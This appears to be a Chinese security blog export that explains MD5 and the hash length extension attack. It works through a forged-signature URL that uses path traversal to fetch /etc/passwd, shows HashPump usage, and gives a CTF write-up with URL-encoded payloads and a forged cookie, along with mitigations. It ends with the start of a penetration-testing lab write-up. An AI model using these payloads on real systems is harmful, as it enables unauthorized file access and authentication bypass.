<p>MD5 算法的输入为长度小于 $2^{64} \ bit$ 的消息比特串，输出为固定 $128 \ bit$ 的消息散列值，输入数据需要以 $512 \ bit$ 为单位进行分组。</p>
<p>MD5 算法的流程图如下：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/md5-process.jpg" alt="md5-process"></p>
<ul>
<li><p>$L$ 是消息比特串的原始长度；</p>
</li>
<li><p>$N$ 是消息扩充后的分组个数；</p>
</li>
<li><p>$M_i$ 是消息扩充后的第 $i$ 个分组，$0 \le i \le N-1$；</p>
</li>
<li><p>$IV$ 是 $128 \ bit$ 的初始链接变量，由 4 个 $32 \ bit$ 的寄存器构成；</p>
</li>
<li><p>$CV_i$ 是链接变量，代表 $M_i$ 分组单元的输入，也是 $M_{i-1}$ 分组单元的输出，$1 \le i \le N-1$。<strong>注意，最后一个分组单元 $M_{N-1}$ 的输出 $CV_N$ 即为消息的散列值。</strong></p>
</li>
</ul>
<p>MD5 算法的具体流程描述如下：</p>
<h2 id="Step-1-附加填充"><a href="#Step-1-附加填充" class="headerlink" title="Step 1 附加填充"></a>Step 1 附加填充</h2><p>先填充一个「1」比特和若干个「0」比特使消息长度在模 512 下与 448 同余，再将消息的原始长度用一个 $64 \ bit$ 的整型表示，以<a href="https://en.wikipedia.org/wiki/Endianness#Little">小端字节序（Little-Endian）</a>的方式继续填充，使得扩充后的消息长度为 $512 \ bit$ 的整数倍，可表示为：</p>
<p>$$<br>\begin{cases}<br>L + padding_seq + padding_len &#x3D; N \times 512  \\<br>L + padding_seq \equiv 448 \ mod \ 512  \\<br>\end{cases}<br>$$</p>
<ul>
<li>$L$ 是消息比特串的原始长度；</li>
<li>$padding_seq$ 是比特串「$100 \cdots 00$」的长度；</li>
<li>$padding_len$ 恒为 $64 \ bit$，代表原始消息长度。</li>
</ul>
<p>各自的取值范围如下：</p>
<p>$$<br>\begin{cases}<br>0 \le L \lt 2^{64}  \\<br>1 \le padding_seq \le 512  \\<br>padding_len &#x3D; 64<br>\end{cases}<br>$$</p>
<p>下面举例说明，假设要对字符串「hello world」进行附加填充：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/example1.jpg" alt="example1"></p>
<p>可见消息比特串长度为 $11 \ Byte$，即 $88 \ bit$，因此在第 $89 \ bit$ 处填充「1」比特，然后填充「0」比特直至长度为 $448 \ bit$，而原始长度 $88 \ bit$ 的十六进制为 $0x58 \ bit$，根据小端原则应放在低地址 $0x00000038$ 处，而高地址全部为 $0x00$。</p>
<p><strong>注意，附加填充对任何消息比特串来说都是必须的，即使消息原始长度恰为 $448 \ bit$：</strong></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/example2.jpg" alt="example2"></p>
<p>即使消息比特串长度为 $56 \ Byte$，即 $448 \ bit$，也要在第 $449 \ bit$ 处填充「1」比特，然后填充「0」比特直至下一分组单元长度为 $448 \ bit$，而原始长度 $448 \ bit$ 的十六进制为 $0x01C0 \ bit$，根据小端原则低地址 $0x00000078$ 处为 $0xC0$，$0x00000079$ 处为 $0x01$，而高地址全部为 $0x00$。</p>
<h2 id="Step-2-初始链接变量"><a href="#Step-2-初始链接变量" class="headerlink" title="Step 2 初始链接变量"></a>Step 2 初始链接变量</h2><p>初始链接变量 $IV$ 在最开始存于 4 个 $32 \ bit$ 的寄存器 $A、B、C、D$ 中，将参与第一个分组单元的哈希运算，它们分别为：</p>
<p>$$<br>\begin{cases}<br>A &#x3D; 0x01234567  \\<br>B &#x3D; 0x89ABCDEF  \\<br>C &#x3D; 0xFEDCBA98  \\<br>D &#x3D; 0x76543210<br>\end{cases}<br>$$</p>
<p><strong>注意，这些值都是以小端字节序存放在各个寄存器中，而实际上它们的值为以下 32 位整型数（对于链接变量 $CV_i$ 也同理，注意实际值与内存中存储值的区别）：</strong></p>
<p>$$<br>\begin{cases}<br>A &#x3D; 0x67452301  \\<br>B &#x3D; 0xEFCDAB89  \\<br>C &#x3D; 0x98BADCFE  \\<br>D &#x3D; 0x10325476<br>\end{cases}<br>$$</p>
<h2 id="Step-3-分组单元迭代压缩"><a href="#Step-3-分组单元迭代压缩" class="headerlink" title="Step 3 分组单元迭代压缩"></a>Step 3 分组单元迭代压缩</h2><p>每个分组单元 $M_i$ 的迭代压缩由 4 轮组成，将 $512 \ bit$ 的分组单元均分为 16 个子分组参与每轮 16 次的步函数运算，每次步函数的输入为 4 个 $32 \ bit$ 的整型变量和 1 个 $32 \ bit$ 的子分组，输出也为 4 个 $32 \ bit$ 的整型变量，作为下一次步函数的输入。经过 4 轮共 64 次的步函数运算后，将 4 个 $32 \ bit$ 寄存器中的结果分别与相应输入链接变量在模 $2^{32}$ 下相加，即得到该分组单元的输出链接变量。若为最后一个分组，则输出为消息的散列值。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/iteration.jpg" alt="iteration"></p>
<p><strong>注意，在第 1 轮开始前，要将输入链接变量 $A、B、C、D$ 的值复制到暂存变量  $AA、BB、CC、DD$ 中，便于 4 轮运算结束后与结果进行模加。</strong></p>
<h2 id="Step-4-步函数"><a href="#Step-4-步函数" class="headerlink" title="Step 4 步函数"></a>Step 4 步函数</h2><p>MD5 迭代压缩算法每一轮都包含 16 次的步函数运算，同一轮中的步函数使用相同的非线性函数，不同轮之间非线性函数是不同的。设输入 $B、C、D$ 是 3 个 $32 \ bit$ 的整型变量，输出是 1 个 $32 \ bit$ 的整型变量，则每一轮的非线性函数 $F、G、H、I$ 分别定义如下：</p>
<p>$$<br>\begin{cases}<br>F(B,C,D) &#x3D; (B \land C) \lor (\lnot B \land D)  \\<br>G(B,C,D) &#x3D; (B \land D) \lor (C \land \lnot D)  \\<br>H(B,C,D) &#x3D; B \oplus C \oplus D  \\<br>I(B,C,D) &#x3D; C \oplus (B \lor \lnot D)<br>\end{cases}<br>$$</p>
<p>其中 $\land、\lor、\lnot、\oplus$ 分别为与、或、非、异或逻辑运算。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/step-function.jpg" alt="step-function"></p>
<ul>
<li>$M[j]$ 表示当前分组单元 $M$ 的第 $j$ 个 $32 \ bit$ 子分组，$0 \le j \le 15$；</li>
<li>$&lt;&lt;&lt; s$ 表示循环左移 $s$ 位；</li>
<li>$T[i]$ 是一个伪随机常数，用于消除输入数据的规律性，$1 \le i \le 64$，$i$ 对应着 4 轮共 64 次步函数的执行顺序，其构造方法与具体取值请见规范 <a href="https://tools.ietf.org/html/rfc1321">RFC 1321</a>。</li>
</ul>
<p>上图为步函数的具体流程：先取输入整型变量 $B、C、D$ 作为参数执行一次非线性函数，将结果依次加上 $A、M[j]、T[i]$，再将结果循环左移 $s$ 位后加上 $B$，把最终结果赋值给 $B$，而 $B、C、D$ 的输入值依次赋值给 $C、D、A$，得到本次步函数的输出，同时也作为下一次步函数的输入。上述加法运算均在模 $2^{32}$ 下。</p>
<h1 id="0x02-Hash-Length-Extension-Attack"><a href="#0x02-Hash-Length-Extension-Attack" class="headerlink" title="0x02 Hash Length Extension Attack"></a>0x02 Hash Length Extension Attack</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>Hash Length Extension Attack</strong> 适用于采用了 Merkle–Damgård 结构的哈希函数，攻击者在不知道 $secret$ 具体的值，但知道其长度的情况下，若已知 $message1$ 与 $MD5(secret \ || \ message1)$，可以推算出 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$ 的值。</p>
<ul>
<li>$||$ 是字符串连接符；</li>
<li>$message1$ 是用户需要计算散列值的明文消息；</li>
<li>$secret$ 是哈希运算中与明文消息一起计算的私密字符串，相当于消息认证码中的 $key$，或者加「盐」哈希中的 $salt$；</li>
<li>$padding1$ 是计算 $MD5(secret \ || \ message1)$ 时的附加填充；</li>
<li>$message2$ 是攻击者构造的任意字符串。</li>
</ul>
<p><strong>注意，若要根据 $MD5(secret \ || \ message1)$ 推算 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$，则必须要知道 $secret$ 和 $message1$ 的长度，因为要先计算 $padding1$ 中 $(secret \ || \ message1)$ 的长度，才能得出 $padding2$ 中 $(secret \ || \ message1 || \ padding1 \ || \ message2)$ 的总长度，其中 $padding2$ 是计算 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$ 时的附加填充。</strong></p>
<p>道哥在《白帽子讲Web安全》的 <strong><a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html">Understanding MD5 Length Extension Attack</a></strong> 一文中对此攻击作了详细叙述，本文就其中的 PoC 举例作出讲解。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/poc.jpg" alt="poc"></p>
<p>为了方便说明，上图 PoC 中只有 $secret$，省略了 $message1$。可见，此处的 $secret$ 为随机产生的一个小数字符串，长度为 $18 \ Byte$，即 $144 \ bit$， $MD5(secret)$ 与 $padding1$ 如上图所示，任意值 $message2$ 此处取为「Welcome to Secrypt Agency!」。攻击后得到的散列值与 $MD5(secret \ || \ padding1 \ || \ message2)$ 相等，表示攻击成功。</p>
<p><strong>注意，这里的 $h0、h1、h2、h3$ 分别为上述的 $A、B、C、D$，并且用 $32 \ bit$ 有符号整型数表示。</strong>如 run time &#x3D; 0 时的 $h0$：</p>
<p>$$<br>h0 &#x3D; 841628852 &#x3D; 0x322a3cb4<br>$$</p>
<p>其小端字节序正好对应散列值的第 $1$ ~ $4 \ Byte$，即 $0xb43c2a32$。对于负数，其补码表示的正数与其在模 $2^{32}$ 下同余的正数相等，如 run time &#x3D; 0 时的 $h2$：</p>
<p>$$<br>h2 &#x3D; -474181071 \equiv 3820786225 \ mod \ 2^{32} &#x3D; 0xe3bc9231<br>$$</p>
<p>其小端字节序对应散列值的第 $9$ ~ $12 \ Byte$，即 $0x3192bce3$。</p>
<p>此处纠正 Understanding MD5 Length Extension Attack 文中 PoC 源代码中的一处错误，在 md5_le.js 文件的 159 行：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="built_in">parseInt</span>(m_len/<span class="number">64</span>)+<span class="number">1</span>; i &lt; databytes.<span class="property">length</span> / <span class="number">64</span>; i++)</span><br></pre></td></tr></table></figure>

<p>其中 <code>i = parseInt(m_len / 64) + 1</code> 并非恒成立，当 $56 \le m_len \ % \ 64 \lt 64$ 时，附加填充将会多占用一个字节，此时应为 <code>i = parseInt(m_len / 64) + 2</code>。</p>
<p><strong>解决方案：在循环前先判断变量 <code>m_len</code> 的范围，再决定变量 <code>i</code> 的取值。</strong></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>假设已登录用户要在某个网站下载 <code>test.pdf</code> 文件，点击下载链接后 URL 如下所示：</p>
<p><code>http://example.com/download?login=1&amp;file=test.pdf&amp;hash=f26e1f5aa1094662caf3a6f8b774e824 </code></p>
<p>已知网站服务器是 Linux 操作系统，后端使用 Python 脚本语言，并在用户下载文件前，需要验证用户的下载权限，所以会先用以下算法生成一个关于文件名的哈希值附在链接末尾：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_hash</span>(<span class="params">salt, login, file_name</span>):</span><br><span class="line">	<span class="keyword">return</span> md5(salt + login + file_name).hexdigest()</span><br></pre></td></tr></table></figure>

<p>再用以下算法验证下载请求的合法性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">verify_hash</span>(<span class="params">salt, login, file_name, user_hash</span>):</span><br><span class="line">	<span class="keyword">if</span> login:</span><br><span class="line">		valid_hash = create_hash(salt, login, file_name)</span><br><span class="line">		<span class="keyword">if</span> valid_hash == user_hash:</span><br><span class="line">			permit_download(file_name)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span> <span class="string">&quot;Your hash is invalid.&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;Please login.&quot;</span></span><br></pre></td></tr></table></figure>

<p>在不知道 <code>salt</code> 具体的值，但知道其长度的情况下，能否下载根目录下的 <code>/etc/passwd</code> 文件呢？</p>
<p>假设 <code>salt</code> 的长度为 6，先列出原问题的已知参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login = &quot;1&quot;</span><br><span class="line">file = &quot;test.pdf&quot;</span><br><span class="line">length(login || file) = 9 Byte = 72 bit</span><br><span class="line">length(salt) = 6 Byte = 48 bit</span><br><span class="line">hash = MD5(salt || &quot;1test.pdf&quot;) = f26e1f5aa1094662caf3a6f8b774e824</span><br></pre></td></tr></table></figure>

<p>再列出待解问题的未知参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login = ？</span><br><span class="line">file = &quot;../../../../../../etc/passwd&quot;</span><br><span class="line">length(login) = ？</span><br><span class="line">length(salt || &quot;1test.pdf&quot;) = 15 Byte = 120 bit</span><br><span class="line">hash = MD5(salt || login || &quot;../../../../../../etc/passwd&quot;) = ？</span><br></pre></td></tr></table></figure>

<p>由上述参数的变化可知，若改变 <code>login</code> 的值后，还能计算出对应的签名，即可达到<strong>任意文件下载</strong>的目的。根据漏洞原理，利用 0x03 中的 HashPump 工具可解出上述未知参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input Signature: f26e1f5aa1094662caf3a6f8b774e824</span><br><span class="line">Input Data: 1test.pdf</span><br><span class="line">Input Key Length: 6</span><br><span class="line">Input Data to Add: ../../../../../../etc/passwd</span><br><span class="line">ee3dc297d57bd7bf82ccf0ae20e35c6b</span><br><span class="line">1test.pdf\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x00\x00\x00\x00\x00\x00../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>可见，在成功构造 <code>login</code> 后，并重新计算出新的签名，结果如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login = &quot;1test.pdf\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">file = &quot;../../../../../../etc/passwd&quot;</span><br><span class="line">length(login) = 58 Byte = 464 bit</span><br><span class="line">length(salt || &quot;1test.pdf&quot;) = 15 Byte = 120 bit</span><br><span class="line">hash = MD5(salt || login || &quot;../../../../../../etc/passwd&quot;) = ee3dc297d57bd7bf82ccf0ae20e35c6b</span><br></pre></td></tr></table></figure>

<p>注意，需要将上述 <code>login</code> 的值进行 URL 编码，以适应浏览器的请求格式，最终构造下载链接的 URL 即可下载 <code>/etc/passwd</code> 文件：</p>
<p><code>http://example.com/download?login=1test.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%78%00%00%00%00%00%00%00&amp;file=../../../../../../etc/passwd&amp;hash=ee3dc297d57bd7bf82ccf0ae20e35c6b</code></p>
<p><strong>哈希长度扩展攻击的限制条件较多，现实中并不常见，下面关于上述漏洞利用场景作几点说明：</strong></p>
<ol>
<li>对于不同文件的校验哈希值，必须由同一个 <code>salt</code> 值产生的；</li>
<li>Web 服务器必须有访问其他目录的权限，否则无法访问根目录下的 <code>/etc/passwd</code> 文件；</li>
<li><code>../</code> 是在命令行下返回上级目录的操作符。由于文件下载目录不在根目录下，所以要通过多个 <code>../</code> 操作返回根目录。注意，在根目录下返回上级目录，仍然是根目录。</li>
</ol>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>Hash Length Extension Attack 是 Merkle–Damgård 结构的固有缺陷，只要采用了此结构的哈希函数都会存在此漏洞。因此没有药到病除的方法，只有以下几条权宜之计供参考：</p>
<ol>
<li><strong>采用 HAMC 或 SHA-3 等</strong>非 Merkle–Damgård 结构的哈希算法；</li>
<li><strong>采用连续两次加「盐」哈希运算</strong>，即 $hash(salt \ + hash(salt \ + \ message))$；</li>
<li><strong>将 $secret$ 值放在输入参数末尾。</strong>若已知 $MD5(message1 \ || \ secret)$，我们希望能求出 $MD5(message1 \ || \ secret \ || \ padding1 \ || \ message2)$，但实际上 $secret$ 的附加策略是在输入参数末尾，因此只能得到 $MD5(message1 \ || \ padding1^{‘} \ || \ message2 \ || \ secret)$。显然，在 $secret$ 未知的情况下是求不出该值的。</li>
</ol>
<h1 id="0x03-HashPump"><a href="#0x03-HashPump" class="headerlink" title="0x03 HashPump"></a>0x03 HashPump</h1><p><a href="https://github.com/bwall/HashPump">HashPump</a> 是基于 OpenSSL 的哈希长度扩展攻击工具，支持对 MD5、SHA-1、SHA-256、SHA-512 等哈希函数的攻击利用。</p>
<p>以下只介绍在 Kali Linux 使用环境下的安装流程，以下命令需要用 <code>root</code> 权限完成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">apt-get install g++ libssl-dev</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> HashPump</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make install</span></span><br></pre></td></tr></table></figure>

<p>安装完成后，输入以下命令，即可得到 HashPump 的用法帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hashpump -h</span></span><br><span class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --help          Display this message.</span><br><span class="line">    -t --test          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length in bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure>

<h1 id="0x04-writeups"><a href="#0x04-writeups" class="headerlink" title="0x04 writeups"></a>0x04 writeups</h1><p>介绍完 Hash Length Extension Attack 的原理与 HashPump 工具的使用方法后，下面借助相关的 CTF 题目来展示该漏洞的实际利用过程。</p>
<h2 id="【实验吧-CTF】-Web-——-让我进去"><a href="#【实验吧-CTF】-Web-——-让我进去" class="headerlink" title="【实验吧 CTF】 Web —— 让我进去"></a>【实验吧 CTF】 Web —— 让我进去</h2><p>此题结合了 PHP 的代码审计与 Hash Length Extension Attack，难度中等，需要的基础知识有：<strong>PHP、Linux、HTTP协议、MD5加密原理。</strong>相关链接如下：</p>
<ul>
<li>题目链接：<a href="http://www.shiyanbar.com/ctf/1848">http://www.shiyanbar.com/ctf/1848</a></li>
<li>解题链接：<a href="http://ctf5.shiyanbar.com/web/kzhan.php">http://ctf5.shiyanbar.com/web/kzhan.php</a></li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-question.jpg" alt="lmi-question"></p>
<p>进入解题链接，发现如下输入框，任意输入一些值，或尝试注入，均无报错信息，且源码也无干货。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-input.jpg" alt="lmi-input"></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-source1.jpg" alt="lmi-source1"></p>
<p>接下来查看它的 HTTP 请求头，发现有两个属于题目本域的异常 Cookie，分别为：<code>sample-hash = 571580b26c65f306376d4f64e53cb5c7</code> 和 <code>source = 0</code>。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-cookie.jpg" alt="lmi-cookie"></p>
<p>尝试用 BurpSuite 把 <code>source</code> 的值改为 1，再次发出请求，果然得到了真正的源代码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-source2.jpg" alt="lmi-source2"></p>
<p>由以下语句可知 Cookie <code>sample-hash</code> 原来是 <code>$secret</code> 与「adminadmin」连接而成的字符串的 MD5 散列值，即上述的 $MD5(secret || message1)$， $secret$ 为 $15 \ Byte$ 长的字符串变量 <code>$secret</code>，$message1$ 为字符串「adminadmin」 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;sample-hash&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;admin&quot;</span> . <span class="string">&quot;admin&quot;</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br></pre></td></tr></table></figure>

<p>又由以下核心语句，得知爆 flag 的条件是设置一个新 Cookie <code>getmein</code>，它的值要与 <code>$secret + $username + $password</code> 组成的字符串的 MD5 散列值相等，但前面还有一个限制条件：<code>$username</code> <strong>必须等于</strong>「admin」，且 <code>$password</code> <strong>不能等于</strong>「admin」。想到这里，就可知此题是要用 Hash Length Extension Attack 来伪造新的散列值绕过验证。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;getmein&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">&quot;getmein&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations! You are a registered user.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;You are not an admin! LEAVE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先要理清代码中的变量与 Hash Length Extension Attack 中变量的对应关系，下面用 HashPump 展示说明该漏洞的攻击过程：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-hashpump.jpg" alt="lmi-hashpump"></p>
<ul>
<li><p><strong>Input Signature</strong> 是 $MD5(secret \ || \ message1)$，此处为 <code>sample-hash</code> 的取值<code>571580b26c65f306376d4f64e53cb5c7</code>；</p>
</li>
<li><p><strong>Input Data</strong> 是 $message1$，此处为字符串「adminadmin」；</p>
</li>
<li><p><strong>Input Key Length</strong> 是 $secret$ 的长度，此处为 15；</p>
</li>
<li><p><strong>Input Data to Add</strong> 是 $message2$，此处设为字符串「ciphersaw」。</p>
</li>
</ul>
<p>可见，得到了 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$ 的结果为 <code>ca78a24c34c2e13331e7b0425b567b09</code> 。</p>
<p>最后，我们只要构造攻击 payload，在 Username 和 Password 框中输入，再创建一个新 Cookie <code>getmein = ca78a24c34c2e13331e7b0425b567b09</code>，Submit 后即能得到 flag 。构造的 payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username：admin</span><br><span class="line">Password：admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00ciphersaw</span><br></pre></td></tr></table></figure>

<p>但注意到源码在判断之前先用 <code>urldecode()</code> 函数对 <code>$username</code> 和 <code>$password</code> 进行 URL 解码，因此要把以上 payload 转换成 URL 编码形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username：%61%64%6d%69%6e</span><br><span class="line">Password：%61%64%6d%69%6e%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00%63%69%70%68%65%72%73%61%77</span><br></pre></td></tr></table></figure>

<p>正确输入 payload 后，成功得到 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-flag.jpg" alt="lmi-flag"></p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
        <tag>Crypto</tag>
        <tag>Vulnerability</tag>
        <tag>实验吧</tag>
        <tag>MD5</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】渗透测试入门 —— 网站综合渗透实验</title>
    <url>/2018/04/15/ichunqiu-pentest-introduction-comprehensive-website-pentest/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本实验同样呈现了一次完整的模拟渗透流程，从最初获取网站管理员的账号密码，然后获得主站的 webshell，最后通过提权获得服务器系统的最高权限。</p>
<p>从实验手册上给出的工具提示可看出，本次渗透貌似更注重<strong>端口扫描</strong>与<strong>社会工程学的运用</strong>，其实大可不必被其限制了思路，当作一种参考方向即可，按照以往的渗透方法一样能达到目的。</p>
<p>简单介绍一下靶机环境：主站为<strong>秋潮个人摄影网站管理系统</strong>，主站下还有一个 <strong><a href="http://www.leadbbs.com/index.asp">LeadBBS</a> 论坛</strong>，均采用 <strong>ASP</strong> 后端脚本语言与 <strong>Microsoft Office Access</strong> 数据库，此类小型 CMS 一般都没有官网，且漏洞较多无人维护，只能从各大软件平台下载源码；服务器系统为 <strong>Windows Server 2003 Enterprise Edition</strong>，如果没打好补丁，此系统也是漏洞百出。显然，靶机采用了经典网站服务器的标配 <strong>Windows + IIS + ASP + Access</strong> 。</p>
<p>可见，本实验的渗透方法与靶机环境与 <a href="https://ciphersaw.github.io/2018/03/20/%E3%80%90i%E6%98%A5%E7%A7%8B%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%20%E2%80%94%E2%80%94%20%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/">【i春秋】渗透测试入门 —— 我很简单，请不要欺负我</a> 中的大同小异，因此可作为本文的参考。</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&r=54399">https://www.ichunqiu.com/battalion?t=2&r=54399</a></li>
<li>解题链接：<a href="https://www.ichunqiu.com/vm/111/1">https://www.ichunqiu.com/vm/111/1</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/guide.png" alt="guide"></p>
<h1 id="0x01-后台管理员「linhai」的密码是？"><a href="#0x01-后台管理员「linhai」的密码是？" class="headerlink" title="0x01 后台管理员「linhai」的密码是？"></a>0x01 后台管理员「linhai」的密码是？</h1><p>后台管理员的密码是打开渗透测试大门的钥匙，但网上关于「秋潮个人摄影网站管理系统」的漏洞信息少之又少，毕竟是个小众 CMS，所以我们只能自己动手，丰衣足食。根据这几次模拟渗透的经验，获取后台管理员密码的思路主要有<strong>敏感信息泄露、SQL 报错注入返回敏感信息、手工注入或利用自动化注入工具直接读取数据库</strong>等，我们还是先按照常规套路：<strong>寻找网页中存在的注入点</strong>。</p>
<h2 id="SQL-自动化注入"><a href="#SQL-自动化注入" class="headerlink" title="SQL 自动化注入"></a>SQL 自动化注入</h2><p>使用 SQL 自动化注入工具是读取数据库信息最高效的方法，熟悉多种注入工具也是一名合格渗透工程师的基本要求，国内外的 SQL 自动化注入工具种类繁多，常见的有明小子（Domian）、穿山甲（Pangolin）、啊D注入工具、SQLMap 等。</p>
